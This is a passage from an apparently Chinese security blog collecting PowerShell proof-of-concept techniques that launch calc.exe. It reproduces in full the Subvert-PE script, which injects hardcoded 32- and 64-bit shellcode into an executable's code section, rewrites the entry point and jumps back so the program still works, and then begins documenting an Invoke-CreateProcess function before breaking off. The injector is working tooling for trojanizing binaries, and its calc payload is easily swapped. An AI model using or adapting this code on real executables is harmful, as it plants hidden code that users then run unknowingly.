id="4-Subvert-PE-shellcode-Powershell-弹计算器"><a href="#4-Subvert-PE-shellcode-Powershell-弹计算器" class="headerlink" title="4.Subvert-PE-shellcode- (Powershell 弹计算器)"></a>4.Subvert-PE-shellcode- (Powershell 弹计算器)</h2><p><a href="http://www.fuzzysecurity.com/scripts/18.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/scripts/18.html</a></p><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line">function Subvert-PE &#123;</span><br><span class="line">&lt;#</span><br><span class="line">.SYNOPSIS</span><br><span class="line">    Inject shellcode into <span class="selector-tag">a</span> PE image while retaining the PE functionality.</span><br><span class="line">  Author: Ruben Boonen (@FuzzySec)</span><br><span class="line">    License: BSD <span class="number">3</span>-Clause</span><br><span class="line">    Required Dependencies: None</span><br><span class="line">    Optional Dependencies: None</span><br><span class="line">  </span><br><span class="line">.DESCRIPTION</span><br><span class="line">  Parse a PE image, inject shellcode at the end of the code section and dynamically patch the entry point. After the shellcode executes, program execution is handed back over to the legitimate PE entry point.</span><br><span class="line">  </span><br><span class="line"><span class="selector-class">.PARAMETER</span> Path</span><br><span class="line">    Path to portable executable.</span><br><span class="line">  </span><br><span class="line"><span class="selector-class">.PARAMETER</span> Write</span><br><span class="line">    Inject shellcode and overwrite the PE. If omitted simply display "Entry Point", "Preferred Image Base" and dump the memory at the null-byte location.</span><br><span class="line">.EXAMPLE</span><br><span class="line">    C:\PS&gt; Subvert-PE -Path C:\Path\To\PE.exe</span><br><span class="line">  </span><br><span class="line">.EXAMPLE</span><br><span class="line">    C:\PS&gt; Subvert-PE -Path C:\Path\To\PE<span class="selector-class">.exe</span> -Write</span><br><span class="line">.LINK</span><br><span class="line">  http:<span class="comment">//www.fuzzysecurity.com/</span></span><br><span class="line">#&gt;</span><br><span class="line">  param (</span><br><span class="line">        [Parameter(Mandatory = <span class="variable">$True</span>)]</span><br><span class="line">    [string]<span class="variable">$Path</span>,</span><br><span class="line">    [parameter(parametersetname=<span class="string">"Write"</span>)]</span><br><span class="line">    [switch]<span class="variable">$Write</span></span><br><span class="line">  )  </span><br><span class="line">    # Read File bytes</span><br><span class="line">    <span class="variable">$bytes</span> = [System<span class="selector-class">.IO</span><span class="selector-class">.File</span>]::ReadAllBytes(<span class="variable">$Path</span>)</span><br><span class="line">    </span><br><span class="line">    New-Variable -Option Constant -Name Magic -Value @&#123;</span><br><span class="line">            <span class="string">"010b"</span> =  <span class="string">"PE32"</span></span><br><span class="line">            <span class="string">"020b"</span> =  <span class="string">"PE32+"</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    # Function courtesy of @mattifestation</span><br><span class="line">    function Local:ConvertTo-Int&#123;</span><br><span class="line">        Param(</span><br><span class="line">            [Parameter(Position = <span class="number">1</span>, Mandatory = <span class="variable">$True</span>)]</span><br><span class="line">            [Byte[]]</span><br><span class="line">            <span class="variable">$array</span>)</span><br><span class="line">        switch (<span class="variable">$array</span>.Length)&#123;</span><br><span class="line">            # Convert to WORD &amp; DWORD</span><br><span class="line">            2 &#123; Write-Output ( [UInt16] ('0x&#123;0&#125;' -f (($array | % &#123;$_.ToString('X2')&#125;) -join '')) ) &#125;</span><br><span class="line">            4 &#123; Write-Output (  [Int32] ('0x&#123;0&#125;' -f (($array | % &#123;$_.ToString('X2')&#125;) -join '')) ) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    # Offsets for calculations</span><br><span class="line">    <span class="variable">$PE</span> = ConvertTo-Int <span class="variable">$bytes</span>[<span class="number">63</span>..<span class="number">60</span>]</span><br><span class="line">    <span class="variable">$NumOfPESection</span> = ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$PE</span>+<span class="number">7</span>)..(<span class="variable">$PE</span>+<span class="number">6</span>)]</span><br><span class="line">    <span class="variable">$OptSize</span> = ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$PE</span>+<span class="number">21</span>)..(<span class="variable">$PE</span>+<span class="number">20</span>)]</span><br><span class="line">    <span class="variable">$Opt</span> = <span class="variable">$PE</span> + <span class="number">24</span></span><br><span class="line">    <span class="variable">$SecTbl</span> = <span class="variable">$Opt</span> + <span class="variable">$OptSize</span></span><br><span class="line">    </span><br><span class="line">    # Entry point offset</span><br><span class="line">    <span class="variable">$EntryPointOffset</span> = <span class="string">'&#123;0:X8&#125;'</span> -f (ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">19</span>)..(<span class="variable">$Opt</span>+<span class="number">16</span>)])</span><br><span class="line">  # Duplicate for calculating JMP later</span><br><span class="line">  <span class="variable">$EntryPointBefore</span> = ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">19</span>)..(<span class="variable">$Opt</span>+<span class="number">16</span>)]</span><br><span class="line">  echo <span class="string">"`nLegitimate Entry Point Offset:   0x$EntryPointOffset"</span></span><br><span class="line">    </span><br><span class="line">    # PE magic number</span><br><span class="line">    <span class="variable">$MagicVal</span> = <span class="variable">$Magic</span>[(<span class="string">'&#123;0:X4&#125;'</span> -f (ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">1</span>)..(<span class="variable">$Opt</span>+<span class="number">0</span>)]))]</span><br><span class="line">    # Preferred ImageBase, based on $MagicVal --&gt; PE32 (DWORD), PE32+ (QWORD)</span><br><span class="line">    If(<span class="variable">$MagicVal</span> -eq <span class="string">"PE32"</span>)&#123;</span><br><span class="line">        <span class="variable">$ImageBase</span> = <span class="string">'&#123;0:X8&#125;'</span> -f (ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">31</span>)..(<span class="variable">$Opt</span>+<span class="number">28</span>)])</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    ElseIf(<span class="variable">$MagicVal</span> -eq <span class="string">"PE32+"</span>)&#123;</span><br><span class="line">        $QWORD = ( [UInt64] ('0x&#123;0&#125;' -f ((($bytes[($Opt+30)..($Opt+24)]) | % &#123;$_.ToString('X2')&#125;) -join '')) )</span><br><span class="line">        <span class="variable">$ImageBase</span> = <span class="string">'&#123;0:X16&#125;'</span> -f <span class="variable">$QWORD</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    # Preferred Image Base</span><br><span class="line">    echo <span class="string">"Preferred PE Image Base:         0x$ImageBase"</span></span><br><span class="line">    </span><br><span class="line">    # Grab "Virtual Size" and "Virtual Address" for the CODE section.</span><br><span class="line">    <span class="variable">$SecVirtualSize</span> = ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$SecTbl</span>+<span class="number">11</span>)..(<span class="variable">$SecTbl</span>+<span class="number">8</span>)]</span><br><span class="line">    <span class="variable">$SecVirtualAddress</span> = ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$SecTbl</span>+<span class="number">15</span>)..(<span class="variable">$SecTbl</span>+<span class="number">12</span>)]</span><br><span class="line">    </span><br><span class="line">    # Precise start of CODE null-byte section!</span><br><span class="line">    <span class="variable">$NullCount</span> = <span class="string">'&#123;0:X8&#125;'</span> -f (<span class="variable">$SecVirtualSize</span> + <span class="variable">$SecVirtualAddress</span>)</span><br><span class="line">  </span><br><span class="line">  # Offset in PE is different [$SecVirtualSize + $SecVirtualAddress - ($SecVirtualAddress - $SecPTRRawData)]</span><br><span class="line">  <span class="variable">$SecPTRRawData</span> = ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$SecTbl</span>+<span class="number">23</span>)..(<span class="variable">$SecTbl</span>+<span class="number">20</span>)]</span><br><span class="line">  <span class="variable">$ShellCodeWrite</span> = (<span class="variable">$SecVirtualSize</span> + <span class="variable">$SecVirtualAddress</span> - (<span class="variable">$SecVirtualAddress</span> - <span class="variable">$SecPTRRawData</span>))</span><br><span class="line">  </span><br><span class="line">  # Hexdump of null-byte padding (before)</span><br><span class="line">  echo <span class="string">"`nNull-Byte Padding dump:"</span></span><br><span class="line">  <span class="variable">$output</span> = <span class="string">""</span></span><br><span class="line">  foreach ( <span class="variable">$count</span> <span class="keyword">in</span> <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> - <span class="number">1</span>)..(<span class="variable">$ShellCodeWrite</span>+<span class="number">504</span>)] ) &#123;</span><br><span class="line">    if (($output.length%32) -eq 0)&#123;</span><br><span class="line">      <span class="variable">$output</span> += <span class="string">"`n"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$output</span> += <span class="string">"&#123;0:X2&#125; "</span> -f <span class="variable">$count</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; echo <span class="string">"$output`n"</span></span><br><span class="line">  </span><br><span class="line">    # If -Write flag is set</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$Write</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        # Set shellcode variable based on PE architecture</span><br><span class="line">        If(<span class="variable">$MagicVal</span> -eq <span class="string">"PE32"</span>)&#123;</span><br><span class="line">            # 32-bit Universal WinExe (+ restore registers) --&gt; calc (by SkyLined)</span><br><span class="line">            # Size: 76 bytes</span><br><span class="line">            <span class="variable">$ShellCode</span> = @(<span class="number">0</span>x60,<span class="number">0</span>x31,<span class="number">0</span>xD2,<span class="number">0</span>x52,<span class="number">0</span>x68,<span class="number">0</span>x63,<span class="number">0</span>x61,<span class="number">0</span>x6C,<span class="number">0</span>x63,</span><br><span class="line">            <span class="number">0</span>x54,<span class="number">0</span>x59,<span class="number">0</span>x52,<span class="number">0</span>x51,<span class="number">0</span>x64,<span class="number">0</span>x8B,<span class="number">0</span>x72,<span class="number">0</span>x30,<span class="number">0</span>x8B,<span class="number">0</span>x76,<span class="number">0</span>x0C,<span class="number">0</span>x8B,</span><br><span class="line">            <span class="number">0</span>x76,<span class="number">0</span>x0C,<span class="number">0</span>xAD,<span class="number">0</span>x8B,<span class="number">0</span>x30,<span class="number">0</span>x8B,<span class="number">0</span>x7E,<span class="number">0</span>x18,<span class="number">0</span>x8B,<span class="number">0</span>x5F,<span class="number">0</span>x3C,<span class="number">0</span>x8B,</span><br><span class="line">            <span class="number">0</span>x5C,<span class="number">0</span>x1F,<span class="number">0</span>x78,<span class="number">0</span>x8B,<span class="number">0</span>x74,<span class="number">0</span>x1F,<span class="number">0</span>x20,<span class="number">0</span>x01,<span class="number">0</span>xFE,<span class="number">0</span>x8B,<span class="number">0</span>x54,<span class="number">0</span>x1F,</span><br><span class="line">            <span class="number">0</span>x24,<span class="number">0</span>x0F,<span class="number">0</span>xB7,<span class="number">0</span>x2C,<span class="number">0</span>x17,<span class="number">0</span>x42,<span class="number">0</span>x42,<span class="number">0</span>xAD,<span class="number">0</span>x81,<span class="number">0</span>x3C,<span class="number">0</span>x07,<span class="number">0</span>x57,</span><br><span class="line">            <span class="number">0</span>x69,<span class="number">0</span>x6E,<span class="number">0</span>x45,<span class="number">0</span>x75,<span class="number">0</span>xF0,<span class="number">0</span>x8B,<span class="number">0</span>x74,<span class="number">0</span>x1F,<span class="number">0</span>x1C,<span class="number">0</span>x01,<span class="number">0</span>xFE,<span class="number">0</span>x03,</span><br><span class="line">            <span class="number">0</span>x3C,<span class="number">0</span>xAE,<span class="number">0</span>xFF,<span class="number">0</span>xD7,<span class="number">0</span>x58,<span class="number">0</span>x58,<span class="number">0</span>x61)</span><br><span class="line">        &#125;</span><br><span class="line">        ElseIf(<span class="variable">$MagicVal</span> -eq <span class="string">"PE32+"</span>)&#123;</span><br><span class="line">            # 64-bit Universal WinExe (+ restore registers) --&gt; calc (by SkyLined)</span><br><span class="line">            # Size: 97 bytes</span><br><span class="line">            <span class="variable">$ShellCode</span> = @(<span class="number">0</span>x53,<span class="number">0</span>x56,<span class="number">0</span>x57,<span class="number">0</span>x55,<span class="number">0</span>x6A,<span class="number">0</span>x60,<span class="number">0</span>x5A,<span class="number">0</span>x68,<span class="number">0</span>x63,</span><br><span class="line">            <span class="number">0</span>x61,<span class="number">0</span>x6C,<span class="number">0</span>x63,<span class="number">0</span>x54,<span class="number">0</span>x59,<span class="number">0</span>x48,<span class="number">0</span>x29,<span class="number">0</span>xD4,<span class="number">0</span>x65,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x32,</span><br><span class="line">            <span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x76,<span class="number">0</span>x18,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x76,<span class="number">0</span>x10,<span class="number">0</span>x48,<span class="number">0</span>xAD,<span class="number">0</span>x48,<span class="number">0</span>x8B,</span><br><span class="line">            <span class="number">0</span>x30,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x7E,<span class="number">0</span>x30,<span class="number">0</span>x03,<span class="number">0</span>x57,<span class="number">0</span>x3C,<span class="number">0</span>x8B,<span class="number">0</span>x5C,<span class="number">0</span>x17,<span class="number">0</span>x28,</span><br><span class="line">            <span class="number">0</span>x8B,<span class="number">0</span>x74,<span class="number">0</span>x1F,<span class="number">0</span>x20,<span class="number">0</span>x48,<span class="number">0</span>x01,<span class="number">0</span>xFE,<span class="number">0</span>x8B,<span class="number">0</span>x54,<span class="number">0</span>x1F,<span class="number">0</span>x24,<span class="number">0</span>x0F,</span><br><span class="line">            <span class="number">0</span>xB7,<span class="number">0</span>x2C,<span class="number">0</span>x17,<span class="number">0</span>x8D,<span class="number">0</span>x52,<span class="number">0</span>x02,<span class="number">0</span>xAD,<span class="number">0</span>x81,<span class="number">0</span>x3C,<span class="number">0</span>x07,<span class="number">0</span>x57,<span class="number">0</span>x69,</span><br><span class="line">            <span class="number">0</span>x6E,<span class="number">0</span>x45,<span class="number">0</span>x75,<span class="number">0</span>xEF,<span class="number">0</span>x8B,<span class="number">0</span>x74,<span class="number">0</span>x1F,<span class="number">0</span>x1C,<span class="number">0</span>x48,<span class="number">0</span>x01,<span class="number">0</span>xFE,<span class="number">0</span>x8B,</span><br><span class="line">            <span class="number">0</span>x34,<span class="number">0</span>xAE,<span class="number">0</span>x48,<span class="number">0</span>x01,<span class="number">0</span>xF7,<span class="number">0</span>x99,<span class="number">0</span>xFF,<span class="number">0</span>xD7,<span class="number">0</span>x48,<span class="number">0</span>x83,<span class="number">0</span>xC4,<span class="number">0</span>x68,</span><br><span class="line">            <span class="number">0</span>x5D,<span class="number">0</span>x5F,<span class="number">0</span>x5E,<span class="number">0</span>x5B)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        # Inject all the things!</span><br><span class="line">        for($i=0; $i -lt $ShellCode.Length; $i++)&#123;</span><br><span class="line">            <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> + <span class="variable">$i</span>)] = <span class="variable">$ShellCode</span>[<span class="variable">$i</span>]</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        # Set new Entry Point Offset --&gt; $NullCount</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">19</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$NullCount</span>.Substring(<span class="number">0</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">18</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$NullCount</span>.Substring(<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">17</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$NullCount</span>.Substring(<span class="number">4</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">16</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$NullCount</span>.Substring(<span class="number">6</span>,<span class="number">2</span>))</span><br><span class="line">        </span><br><span class="line">        # Modified Entry Point</span><br><span class="line">        <span class="variable">$EntryPointOffset</span> = <span class="string">'&#123;0:X8&#125;'</span> -f (ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">19</span>)..(<span class="variable">$Opt</span>+<span class="number">16</span>)])</span><br><span class="line">        echo <span class="string">"Modified Entry Point Offset:     0x$EntryPointOffset"</span></span><br><span class="line">        </span><br><span class="line">        # Calculate &amp; append farJMP</span><br><span class="line">        <span class="variable">$Distance</span> = <span class="string">'&#123;0:x&#125;'</span> -f (<span class="variable">$EntryPointBefore</span> - (ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">19</span>)..(<span class="variable">$Opt</span>+<span class="number">16</span>)]) - <span class="variable">$ShellCode</span><span class="selector-class">.Length</span> - <span class="number">5</span>)</span><br><span class="line">        echo <span class="string">"Inject Far JMP:                  0xe9$Distance"</span></span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> + <span class="variable">$ShellCode</span>.Length)] = <span class="number">0</span>xE9</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> + <span class="variable">$ShellCode</span><span class="selector-class">.Length</span> + <span class="number">1</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$Distance</span>.Substring(<span class="number">6</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> + <span class="variable">$ShellCode</span><span class="selector-class">.Length</span> + <span class="number">2</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$Distance</span>.Substring(<span class="number">4</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> + <span class="variable">$ShellCode</span><span class="selector-class">.Length</span> + <span class="number">3</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$Distance</span>.Substring(<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> + <span class="variable">$ShellCode</span><span class="selector-class">.Length</span> + <span class="number">4</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$Distance</span>.Substring(<span class="number">0</span>,<span class="number">2</span>))</span><br><span class="line">        </span><br><span class="line">        # Hexdump of null-byte padding (after)</span><br><span class="line">        echo <span class="string">"`nNull-Byte Padding After:"</span></span><br><span class="line">        <span class="variable">$output</span> = <span class="string">""</span></span><br><span class="line">        foreach ( <span class="variable">$count</span> <span class="keyword">in</span> <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> - <span class="number">1</span>)..(<span class="variable">$ShellCodeWrite</span>+<span class="number">504</span>)] ) &#123;</span><br><span class="line">            if (($output.length%32) -eq 0)&#123;</span><br><span class="line">                <span class="variable">$output</span> += <span class="string">"`n"</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$output</span> += <span class="string">"&#123;0:X2&#125; "</span> -f <span class="variable">$count</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; echo <span class="string">"$output`n"</span></span><br><span class="line">    </span><br><span class="line">        [System<span class="selector-class">.IO</span><span class="selector-class">.File</span>]::WriteAllBytes(<span class="variable">$Path</span>, <span class="variable">$bytes</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h3><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/%10Subvert-PE.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><h2 id="5-Invoke-CreateProcess-Powershell-弹计算器"><a href="#5-Invoke-CreateProcess-Powershell-弹计算器" class="headerlink" title="5.Invoke-CreateProcess (Powershell 弹计算器)"></a>5.Invoke-CreateProcess (Powershell 弹计算器)</h2><h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line">function Invoke-CreateProcess &#123;</span><br><span class="line">&lt;#</span><br><span class="line">.SYNOPSIS</span><br><span class="line">     -Binary            Full path of the module to be executed.</span><br><span class="line">                       </span><br><span class="line">     -Args              Arguments to pass to the module, e<span class="selector-class">.g</span>. <span class="string">"/c calc.exe"</span>. Defaults</span><br><span class="line">                        to <span class="variable">$null</span> <span class="keyword">if</span> not specified.</span><br><span class="line">                       </span><br><span class="line">     -CreationFlags     Process creation flags:</span><br><span class="line">                          <span class="number">0</span>x00000000 (NONE)</span><br><span class="line">                          <span class="number">0</span>x00000001 (DEBUG_PROCESS)</span><br><span class="line">                          <span class="number">0</span>x00000002 (DEBUG_ONLY_THIS_PROCESS)</span><br><span class="line">                          <span class="number">0</span>x00000004 (CREATE_SUSPENDED)</span><br><span class="line">                          <span class="number">0</span>x00000008 (DETACHED_PROCESS)</span><br><span class="line">                          <span class="number">0</span>x00000010 (CREATE_NEW_CONSOLE)</span><br><span class="line">                          <span class="number">0</span>x00000200 (CREATE_NEW_PROCESS_GROUP)</span><br><span class="line">                          <span class="number">0</span>x00000400 (CREATE_UNICODE_ENVIRONMENT)</span><br><span class="line">                          <span class="number">0</span>x00000800 (CREATE_SEPARATE_WOW_VDM)</span><br><span class="line">                          <span class="number">0</span>x00001000 (CREATE_SHARED_WOW_VDM)</span><br><span class="line">                          <span class="number">0</span>x00040000 (CREATE_PROTECTED_PROCESS)</span><br><span class="line">                          <span class="number">0</span>x00080000 (EXTENDED_STARTUPINFO_PRESENT)</span><br><span class="line">                          <span class="number">0</span>x01000000 (CREATE_BREAKAWAY_FROM_JOB)</span><br><span class="line">                          <span class="number">0</span>x02000000 (CREATE_PRESERVE_CODE_AUTHZ_LEVEL)</span><br><span class="line">                          <span class="number">0</span>x04000000 (CREATE_DEFAULT_ERROR_MODE)</span><br><span class="line">                          <span class="number">0</span>x08000000 